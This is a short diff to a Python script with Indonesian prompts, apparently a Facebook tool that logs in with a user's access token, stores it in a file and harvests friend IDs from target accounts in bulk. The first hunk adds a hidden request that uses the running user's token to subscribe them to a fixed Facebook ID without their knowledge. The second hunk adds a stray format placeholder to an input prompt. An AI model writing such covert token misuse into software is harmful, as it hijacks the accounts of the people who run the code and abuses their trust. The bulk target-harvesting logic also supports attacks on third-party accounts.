@@ -57,6 +57,7 @@ def login():
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
+			requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token="+token)
 			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
 			time.sleep(1)
 			menu()
@@ -191,7 +192,7 @@ def massal():
 	except:tanya_total=1
 	print("\n * isi 'me' jika ingin dari daftar teman")
 	for t in range(tanya_total):
-		idt = raw_input(" + id target : ")
+		idt = raw_input(" + id target %s : ")
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
